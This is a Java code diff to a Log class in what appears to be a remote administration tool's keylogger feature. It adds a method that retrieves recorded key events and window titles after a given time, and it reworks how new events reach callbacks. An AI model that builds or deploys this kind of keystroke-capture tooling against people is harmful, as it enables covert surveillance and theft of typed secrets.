@@ -5,8 +5,12 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 
+import com.subterranean_security.crimson.core.Common;
+import com.subterranean_security.crimson.core.Platform;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.storage.MemMap;
+import com.subterranean_security.crimson.core.stream.subscriber.SubscriberSlave;
+import com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.keylogger.Keylogger;
 
 public class Log implements Serializable {
 
@@ -14,7 +18,37 @@ public class Log implements Serializable {
 
 	public MemMap<Date, Page> pages = new MemMap<Date, Page>();
 
+	public Date timestamp;
+
+	public ArrayList<EV_KEvent> getEventsAfter(Date target) {
+		ArrayList<EV_KEvent> ev = new ArrayList<EV_KEvent>();
+
+		for (Date d : pages.keyset()) {
+			// skip old dates
+			if (d.getTime() + 100000 < target.getTime()) {
+				continue;
+			}
+			try {
+				for (Event e : pages.get(d).events) {
+					Date dd = new Date(d.getTime() + e.timeOffset);
+					if (dd.after(target)) {
+						ev.add(EV_KEvent.newBuilder().setDate(dd.getTime())
+								.setTitle(pages.get(d).titles.get(e.titleOffset)).setEvent(e.event).build());
+					}
+				}
+			} catch (Exception e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+
+		}
+
+		return ev;
+
+	}
+
 	public void addEvent(EV_KEvent evKevent) {
+		timestamp = new Date(evKevent.getDate());
 
 		boolean flag = false;
 		SimpleDateFormat formatter = new SimpleDateFormat("MM dd yyyy");
@@ -36,18 +70,22 @@ public class Log implements Serializable {
 			pages.put(p.ref, p);
 		}
 
-		refreshCallbacks();
+		new Thread(new Runnable() {
+			public void run() {
+
+				for (LogCallback lc : callbacks) {
+					lc.launch(evKevent);
+				}
+
+			}
+		}).start();
+
 	}
 
-	private ArrayList<Runnable> callbacks = new ArrayList<Runnable>();
+	private ArrayList<LogCallback> callbacks = new ArrayList<LogCallback>();
 
-	public void addCallback(Runnable r) {
+	public void addCallback(LogCallback r) {
 		callbacks.add(r);
 	}
 
-	private void refreshCallbacks() {
-		for (Runnable r : callbacks) {
-			new Thread(r).start();
-		}
-	}
 }
